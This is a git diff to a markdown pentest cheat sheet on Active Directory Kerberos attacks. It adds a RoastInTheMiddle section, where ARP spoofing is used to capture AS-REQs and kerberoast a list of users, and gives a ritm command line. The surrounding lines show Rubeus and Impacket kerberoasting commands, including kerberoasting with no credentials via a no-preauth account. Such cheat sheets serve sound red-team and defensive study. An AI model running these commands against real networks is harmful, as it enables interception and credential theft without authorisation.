@@ -192,6 +192,7 @@ Get-DomainUser -SPN
 # Rubeus
 Rubeus.exe kerberoast /nowrap
 ```
+
 **Update**: A research has been done by [@exploitph](https://twitter.com/exploitph) concludes that a user that has `Not-RequirePreAuth` property enabled can perform [Kerberoasting](#kerberoasting) without needing the password of the account. Detailed explanation can be read [here](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/). 
 > When a ticket is requested without pre-authentication, the result still includes an encrypted part. This encrypted part is encrypted with the credential key used for authentication and contains the session key for the ticket included within the reply. This is the encrypted data used in the [ASREPRoast attack](https://blog.harmj0y.net/activedirectory/roasting-as-reps/) by [Will Schroeder](https://twitter.com/harmj0y). The resulting TGT is usable only with access to the requesting accounts key, since the TGT session key is required. However, for Kerberoasting, access to the session key is not required. Only the resulting ST—or more accurately, the encrypted part of the ST, which is not secured with the requesting accounts key—is required. Therefore, if any account is configured to not require pre-authentication, it is possible to Kerberoast without **any** credentials.
 ```
@@ -201,8 +202,17 @@ Rubeus.exe kerberoast /nowrap
 # Impacket
 GetUserSPNs.py kiwi.local/ -no-preauth bethany.linnell -usersfile /tmp/users.lst -dc-ip 192.168.86.189
 ```
+
+**RoastInTheMiddle**
+This attack will require you to arp spoof and wait for AS-REQ and perform kerberoast with the list provided. The tool can be found [here](https://github.com/Tw1sm/RITM).
+> The POC starts four threads, a sniffer, an ARP spoofer, a re-assembler (for requests that are split across multiple packets), and the roaster. When it sees an AS-REQ, the POC starts trying to Kerberoast the supplied list, which can contain usernames or SPNs
+```
+ritm -i eth0 -t 192.168.86.184 -g 192.168.86.1 -d 192.168.86.182 -u /tmp/users.lst
+```
+
 **References**
 * https://www.semperis.com/blog/new-attack-paths-as-requested-sts/
+* https://github.com/Tw1sm/RITM
 * https://twitter.com/_nwodtuhs/status/1575082377189429250?s=20&t=iS5ugj6lp5GyL6QF4jWn0Q
 
 ### Unconstrained / Constrained Object
